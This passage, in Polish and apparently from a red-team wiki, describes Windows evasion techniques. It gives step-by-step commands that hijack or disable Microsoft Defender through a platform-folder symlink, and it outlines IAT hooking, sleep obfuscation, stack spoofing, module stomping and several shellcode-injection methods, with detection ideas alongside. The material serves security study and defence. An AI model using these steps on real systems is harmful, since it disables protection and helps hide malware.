Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy usługi Defender (odpowiednio aktualizując ścieżki usługi/rejestru). Mechanizm ten ufa wpisom katalogu, w tym punktom ponownej analizy katalogu (dowiązaniom symbolicznym). Administrator może wykorzystać to, aby przekierować Defendera do ścieżki zapisywalnej przez atakującego i przeprowadzić DLL sideloading lub zakłócić działanie usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Warunki wstępne
- Lokalny administrator (wymagany do tworzenia katalogów/dowiązań symbolicznych w katalogu Platform)
- Możliwość ponownego uruchomienia systemu lub wywołania ponownego wyboru platformy Defendera (restart usługi podczas rozruchu)
- Wymagane są wyłącznie wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy w swoich własnych katalogach, ale podczas wyboru platformy ufa wpisom katalogu i wybiera leksykograficznie najwyższą wersję bez sprawdzania, czy ścieżka docelowa prowadzi do chronionej/zaufanej lokalizacji.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego katalogu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz w Platform dowiązanie symboliczne do katalogu o wyższej wersji, wskazujące na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecany restart):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) jest uruchamiany z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Należy zaobserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestr odzwierciedlające tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Umieść/zastąp biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Zatrzymanie usługi/odmowa usługi: Usuń symlink wersji, aby przy następnym uruchomieniu skonfigurowana ścieżka nie została rozwiązana, a Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie umożliwia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły red team mogą przenieść unikanie detekcji w czasie wykonywania z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego kod niezależny od pozycji (PIC). Uogólnia to unikanie detekcji poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) i rozszerza te same zabezpieczenia na BOF-y oraz biblioteki DLL używane w post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście z wysokiego poziomu
- Umieść blob PIC obok modułu docelowego, używając reflective loadera (dołączonego na początku lub jako moduł towarzyszący). PIC musi być samowystarczalny i niezależny od pozycji.
- Podczas ładowania hostującej biblioteki DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmodyfikuj wpisy IAT dla docelowych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
- Każdy wrapper PIC wykonuje mechanizmy unikania detekcji, a następnie przekazuje sterowanie do właściwego adresu API. Typowe mechanizmy obejmują:
  - Maskowanie/odsłanianie pamięci wokół wywołania (np. szyfrowanie obszarów beacona, zmiana RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
  - Call-stack spoofing: utworzenie pozornie nieszkodliwego stosu i przejście do docelowego API, aby analiza call stacka wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zapewnienia zgodności wyeksportuj interfejs, który pozwoli skryptowi Aggressor (lub odpowiednikowi) rejestrować API do hookowania dla Beacon, BOF-ów i bibliotek DLL używanych w post-exploitation.

Dlaczego w tym przypadku warto użyć IAT hooking
- Działa dla każdego kodu używającego hookowanego importu — bez modyfikowania kodu narzędzia ani polegania na Beaconie, który miałby proxy’ować konkretne API.
- Obejmuje biblioteki DLL używane w post-exploitation: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować te same mechanizmy maskowania/unikania detekcji przez call stack do wywołań ich API.
- Przywraca niezawodne działanie poleceń post-exploitation tworzących procesy w przypadku detekcji opartych na call stacku, dzięki opakowaniu CreateProcessA/W.

Minimalny przykład IAT hooka (pseudokod x64 w C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Uwagi
- Zastosuj łatkę po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loaders, takie jak TitanLdr/AceLdr, pokazują, jak wykonywać hooking w DllMain załadowanego modułu.
- Wrappery powinny być małe i bezpieczne dla PIC; prawdziwe API rozpoznawaj za pomocą oryginalnej wartości IAT przechwyconej przed patchowaniem albo przez LdrGetProcedureAddress.
- Przy PIC stosuj przejścia RW → RX i nie pozostawiaj stron z uprawnieniami do zapisu i wykonywania.

Stub do spoofingu call stacka
- Stub PIC w stylu Draugr tworzą fałszywy łańcuch wywołań (adresy powrotu wewnątrz niegroźnych modułów), a następnie wykonują pivot do prawdziwego API.
- Pozwala to ominąć detekcje oczekujące kanonicznych stacków z Beacon/BOFs przy wywołaniach wrażliwych API.
- Połącz tę metodę z technikami stack cutting/stack stitching, aby znaleźć się w oczekiwanych ramkach przed prologiem API.

Integracja operacyjna
- Dodaj reflective loader na początku DLL-i post-ex, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL-a.
- Użyj skryptu Aggressor do rejestrowania docelowych API, aby Beacon i BOFs korzystały z tej samej ścieżki evasion bez zmian w kodzie.

Kwestie wykrywania/DFIR
- Integralność IAT: wpisy wskazujące adresy spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importów.
- Anomalie stacka: adresy powrotu nienależące do załadowanych obrazów; nagłe przejścia do PIC spoza obrazu; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy wewnątrz procesu do IAT, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone podczas ładowania.
- Omijanie image-load: w przypadku hookowania LoadLibrary* monitoruj podejrzane załadowania assembly automatyzacji/clr skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy i przykłady
- Reflective loaders wykonujące IAT patching podczas ładowania (np. TitanLdr, AceLdr)
- Hooki do maskowania pamięci (np. simplehook) i PIC do stack cutting (stackcutting)
- Stub PIC do spoofingu call stacka (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hooki IAT w czasie importu za pomocą rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera do `GetProcAddress` własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Utwórz **rezydentny PICO** (trwały obiekt PIC), który pozostaje aktywny po zwolnieniu pamięci przez tymczasowy loader PIC.
- Udostępnij funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy ordinalne i użyj wyszukiwania hooków opartego na hashach, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie wywołaj prawdziwe `GetProcAddress`.
- Zarejestruj cele hooków podczas linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje prawidłowy, ponieważ znajduje się wewnątrz rezydentnego PICO.

Dzięki temu **przekierowanie IAT w czasie importu** odbywa się bez patchowania sekcji kodu załadowanego DLL-a po załadowaniu.

### Wymuszanie importów możliwych do hookowania, gdy cel używa PEB-walking

Hooki w czasie importu zadziałają tylko wtedy, gdy funkcja rzeczywiście znajduje się w IAT celu. Jeśli moduł rozpoznaje API za pomocą PEB-walk + hash (bez wpisu importu), wymuś prawdziwy import, aby ścieżka `ProcessImports()` loadera go obsłużyła:

- Zastąp rozpoznawanie wyeksportowanych funkcji na podstawie hashy (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie go podczas rozpoznawania importów przez reflective loader.

### Obfuskacja uśpienia/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch obfuskacji w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz na `PAGE_READWRITE` → szyfruj RC4 za pomocą `advapi32!SystemFunction032` cały zmapowany obraz → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać poszczególne kroki.

Szczegół operacyjny: dla długich oczekiwań zwracaj „sukces” (np. `WAIT_OBJECT_0`), aby wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami w okresach bezczynności i pozwala uniknąć charakterystycznego śladu po „patchowanym `Sleep()`”.

Pomysły na wykrywanie (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` obejmujący duży zakres, po którym następuje własne przywracanie uprawnień poszczególnych sekcji.

### Rejestrowanie gadgetów sleep-obfuscation w CFG w czasie działania

W celach z włączonym CFG pierwszy skok pośredni do gadgetu ze środka funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje awarię procesu z kodem `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadget nie znajduje się w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w zahartowanych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy cel pośredni używany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **cały jego rozmiar**.
- W przypadku ręcznie mapowanych regionów/PIC/stomped użyj zamiast tego **bazy alokacji** i rozmiaru alokacji.
- Oznacz nie tylko gadget dyspozytora, ale także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe związane z oczekiwaniem/zdarzeniami) oraz wszystkie wykonywalne sekcje kontrolowane przez atakującego, które będą celami pośrednimi.

Dzięki temu łańcuchy sleep w stylu ROP/JOP zmieniają się z „działają tylko w procesach bez CFG” w wielokrotnego użytku prymityw dla `explorer.exe`, przeglądarek, `svchost.exe` i innych endpointów skompilowanych z `/guard:cf`.

### Spoofing stacka bezpieczny dla CET w uśpionych wątkach

Pełna podmiana `CONTEXT` jest łatwa do wykrycia i może nie działać w systemach z CET Shadow Stack, ponieważ spoofowany `Rip` musi nadal zgadzać się ze sprzętowym shadow stackiem. Bezpieczniejszy wzorzec maskowania podczas uśpienia wygląda następująco:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stacka `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Utwórz kopię zapasową prawdziwego TEB/TIB bieżącego wątku.
- Przechwyć prawdziwy kontekst uśpionego wątku za pomocą `GetThreadContext`.
- Skopiuj do spoofowanego kontekstu **tylko** prawdziwy `Rip`, pozostawiając spoofowany stan `Rsp`/stacka bez zmian.
- Na czas uśpienia skopiuj `NT_TIB` spoofowanego wątku do TEB bieżącego wątku, aby stack walker rozwijał stos w prawidłowym zakresie stacka.
- Po zakończeniu oczekiwania przywróć oryginalny TIB i kontekst wątku.

Pozwala to zachować wskaźnik instrukcji zgodny z CET, jednocześnie wprowadzając w błąd stack walkery EDR, które ufają metadanym stacka w TEB podczas walidacji rozwijania stosu.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch z użyciem kolejki timerów jest zbyt charakterystyczny, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z zawieszonego wątku pomocniczego za pomocą kolejkowanych APC:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako punktem wejścia.
- Zakolejkuj przygotowane ramki `CONTEXT`/APC za pomocą `NtQueueApcThread` i opróżnij kolejkę przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na heapie, a nie na stacku wątku, aby uniknąć wyczerpania domyślnego stacka wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować wątek.
- Zawieś główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → przywrócenie → `NtResumeThread`), aby skrócić okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stack.

Ta metoda zastępuje charakterystyczną sekwencję `CreateTimerQueueTimer` + `NtContinue` sekwencją z wątkiem pomocniczym/APC, zachowując te same cele maskowania RC4 i spoofingu stacka.

Dodatkowe pomysły na wykrywanie
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed uśpieniem, oczekiwaniem lub dispatch APC.
- `GetThreadContext`/`SetThreadContext` używane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stacka TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread`, które pośrednio wywołują `SystemFunction032`, `VirtualProtect` lub funkcje pomocnicze przywracające uprawnienia sekcji.
- Wielokrotne użycie krótkich sygnatur gadgetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako pivotów dyspozytora wewnątrz podpisanych modułów.


## Precision Module Stomping

Module stomping uruchamia payloady z **sekcji `.text` DLL-a już zmapowanego w procesie docelowym**, zamiast alokować oczywistą prywatną pamięć wykonywalną lub ładować nowy sacrificial DLL. Celem nadpisania powinien być **załadowany obraz wspierany przez plik na dysku**, którego przestrzeń kodu może pomieścić payload bez uszkadzania ścieżek kodu nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwny stomping popularnych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodny: DLL może nie być załadowany w zdalnym procesie, a zbyt mały obszar kodu spowoduje awarię procesu. Bardziej niezawodny przebieg pracy wygląda następująco:

1. Wylicz moduły procesu docelowego i zachowaj **listę dołączanych nazw** DLL-i, które są już załadowane.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydackie DLL-e na dysku i porównaj rozmiar sekcji PE **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. Ma to większe znaczenie niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zmapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset stomping.
5. Oblicz **zasięg uszkodzeń**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone za nią w pamięci.

Typowe narzędzia pomocnicze do rekonesansu/wyboru celu spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Notatki operacyjne
- Preferuj biblioteki DLL **już załadowane** w zdalnym procesie, aby uniknąć telemetrii związanej z `LoadLibrary`/nieoczekiwanym ładowaniem obrazów.
- Preferuj eksporty rzadko wykonywane przez aplikację docelową; w przeciwnym razie zwykłe ścieżki kodu mogą trafić na nadpisane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode z literału ciągu znaków na **tablicę bajtów/inicjalizator w nawiasach klamrowych**, aby cały bufor został poprawnie uwzględniony w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do **wykonywalnych stron mapowanych z obrazu** (`MEM_IMAGE`, `PAGE_EXECUTE*`), zamiast do częściej używanych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie są już zgodne z plikiem źródłowym na dysku.
- Zdalne wątki lub zmiany kontekstu wykonania, które rozpoczynają wykonywanie wewnątrz eksportu legalnej biblioteki DLL, którego początkowe bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` skierowane na strony `.text` biblioteki DLL, po których następuje utworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **wstrzykiwania do procesu / unikania EDR**, która omija klasyczną ścieżkę zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatruwanie, kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia praktyczne dotyczące nośników:

- `lpCommandLine` musi wskazywać na **zapisywalną pamięć** podczas wywołania `CreateProcessW`; jego długość jest ograniczona do **32,767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi wskazywać na blok środowiska Unicode zawierający kolejne ciągi `NAZWA=WARTOŚĆ\0`, zakończone dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu zwykłe tworzenie procesu staje się **mechanizmem przesyłania payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi, a Windows wykonuje kopiowanie między procesami.

### Zdalne wyszukiwanie bez zdalnych API zapisu

Po utworzeniu procesu potomnego odnajdź skopiowany bufor za pomocą prymitywów **wyłącznie do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podążaj za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przebieg:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów jest zwykle `RW`, a nie wykonywalny. Typowy łańcuch P3 wygląda tak:

1. Utwórz proces normalnie (nie w stanie wstrzymania)
2. Ustaw wybraną stronę parametrów jako wykonywalną za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego wcześniej w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisując `RIP`)

W przeciwieństwie do klasycznych procedur przejmowania wątku, **nie wymaga to** `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio za pomocą zwróconego uchwytu głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem wstrzykiwania:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtem null i etapowy shellcode

Wszystkie trzy nośniki zawierają **dane tekstowe lub podobne do tekstowych**, więc surowy payload zawierający `0x00` zostaje obcięty podczas przesyłania. Praktycznym obejściem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie wykonywania, a następnie ładuje dowolny drugi etap.

Prosty wzorzec polega na syntezie stałych opartej na XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

To pozwala pierwszemu etapowi tworzyć na stosie ciągi znaków, argumenty API, ścieżki DLL lub loader shellcode drugiego etapu bez umieszczania bajtów null w przesyłanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg znaków/bufor na stosie procesu docelowego
- zarezerwować **32-bajtową przestrzeń shadow space dla x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej ochronę na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i wykonać skok do niej, unikając bezpośredniej alokacji RWX.

### Sposoby wykrywania

Dobre możliwości wykrywania wskazane przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` nadające **stronom parametrów procesu** uprawnienia do wykonywania
- po tej zmianie ochrony następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w polach `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sposób transferu między procesami**, a nie samodzielny, kompletny mechanizm wykonania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

Aby dostarczyć payload do **istniejącego** procesu Windows za pomocą opisów wątków, a następnie przejąć adres powrotu wątku oczekującego, zobacz [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Wstrzykiwanie przez potok STDIN konsoli

Interaktywny proces potomny konsoli może również służyć jako **mechanizm transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do potoku i wysyła znacznik, po którym następuje shellcode. Gdy program konsoli odczyta dane do własnej, prywatnej pamięci, injector odnajduje ten bufor, nadaje mu uprawnienia do wykonywania i przekierowuje do niego wątek potomny. Pozwala to uniknąć `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to wstrzykiwanie do procesu, a nie ogólna metoda omijania EDR.<sup>[[41]](#references)</sup>

Mimo określenia „named-pipe” implementacja referencyjna wywołuje `CreatePipe`, które tworzy **anonymous pipe**. Windows wewnętrznie implementuje anonymous pipes za pomocą unikatowych obiektów nazwanych potoków, ale PoC ani nie wybiera ścieżki `\\.\pipe\<name>`, ani nie wywołuje `CreateNamedPipe`. Tworzy dziedziczone uchwyty z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego PoC uruchamia podany plik wykonywalny konsoli; nie podłącza potoku do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Przebieg referencyjny

Implementacja wykorzystuje następujący ciąg działań:<sup>[[41]](#references)</sup>

1. Utworzenie par anonymous pipe dla `STDIN` i `STDOUT` procesu potomnego. Wyłączenie dziedziczenia dla dwóch uchwytów po stronie procesu nadrzędnego i zamknięcie duplikatów uchwytów po stronie procesu potomnego w procesie nadrzędnym po utworzeniu procesu.
2. Uruchomienie interaktywnego pliku wykonywalnego, takiego jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane standardowe uchwyty.
3. Wysłanie kompletnej tablicy binarnej `rawData` za pomocą `WriteFile` przez uchwyt `STDIN` po stronie procesu nadrzędnego. Program konsoli pobiera bajty i pozostawia ich kopię w jednym ze swoich prywatnych zatwierdzonych obszarów pamięci.
4. Przejście przez przestrzeń adresową procesu potomnego za pomocą `VirtualQueryEx`, odczyt kandydatów w postaci obszarów `MEM_PRIVATE` przez `ReadProcessMemory` i wyszukanie znacznika na początku `rawData`.
5. Zmiana ochrony wykrytego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikowanie głównego wątku, zawieszenie go, ustawienie `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread` i wznowienie go.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest specyficzna dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się od 25-bajtowego znacznika, więc wykonywane bajty rozpoczynają się pod offsetem szesnastkowym `0x19`. Przy zastępowaniu payloadu zachowaj ten układ albo odpowiednio zaktualizuj znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają też `0x0A`, `0x0D` i `0x1A` jako bad characters. Ten workflow nie zmienia tokenu ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Informacje o małych natywnych helperach i wzorcach kompilacji payloadów znajdziesz w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Wstrzykiwanie DLL przez callback puli wątków bez shellcode (DLLParty)

DLLParty adaptuje wstrzykiwanie do puli wątków w stylu PoolParty, aby skłonić istniejący worker procesu docelowego do wywołania `LoadLibraryA`, zamiast wykonywać wstrzyknięty stub callbacku. Mechanizmem dyspozycji jest obiekt ukończenia `TP_DIRECT` umieszczany w porcie ukończenia I/O puli procesu docelowego. Nie omija to uprawnień procesu: PoC wywołuje `OpenProcess(PROCESS_ALL_ACCESS)` i wymaga możliwości odczytu i zapisu pamięci procesu docelowego oraz duplikowania uchwytów worker-factory i portu ukończenia.<sup>[[46]](#references)[[47]](#references)</sup>

W Windows x64 worker przekazuje wskaźnik do instancji `TP_CALLBACK_INSTANCE` umieszczonej na stosie w `RCX`, czyli jako pierwszy argument callbacku. `LoadLibraryA` interpretuje ten sam wskaźnik jako `LPCSTR`. Na testowanej ścieżce `TppWorkerThread` umieszcza wskaźnik pod `RSP+0x178`, a pierwszy zwykły zapis do tego obiektu wykonuje pod `RSP+0x1d0`. Dlatego zakończona znakiem null ścieżka DLL, która mieści się w tym prefiksie o długości 0x58 bajtów, może znaleźć się na początku instancji bez nadpisania przed wywołaniem callbacku. To obserwacja dotycząca konkretnej kompilacji, a nie udokumentowana gwarancja ABI systemu Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Referencyjny workflow:<sup>[[46]](#references)[[47]](#references)</sup>

1. Wylicz uchwyty procesu docelowego za pomocą `NtQuerySystemInformation(SystemHandleInformation)` i zidentyfikuj `TpWorkerFactory`, odpytując typy obiektów. Zduplikuj uchwyt worker-factory i odpytaj `WorkerFactoryBasicInformation`; `StartParameter` wskazuje zdalny `TP_POOL`. Pomiń fabryki, dla których `TotalWorkerCount == 0`.
2. Odczytaj `TP_POOL.CompletionPort` i przejdź po prywatnej liście workerów puli. W testowanej kompilacji Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) jej głowa znajduje się pod adresem `pool+0x60`; każde łącze pod adresem `worker+0x10`, więc slot instancji callbacku pod adresem `worker+0x38` jest równy `link+0x28`. PoC sprawdza wyrównanie wskaźników, wzajemne powiązania łączy, przynależność do puli, niezerowe identyfikatory wątków, powtarzające się węzły i stabilność głowy listy.
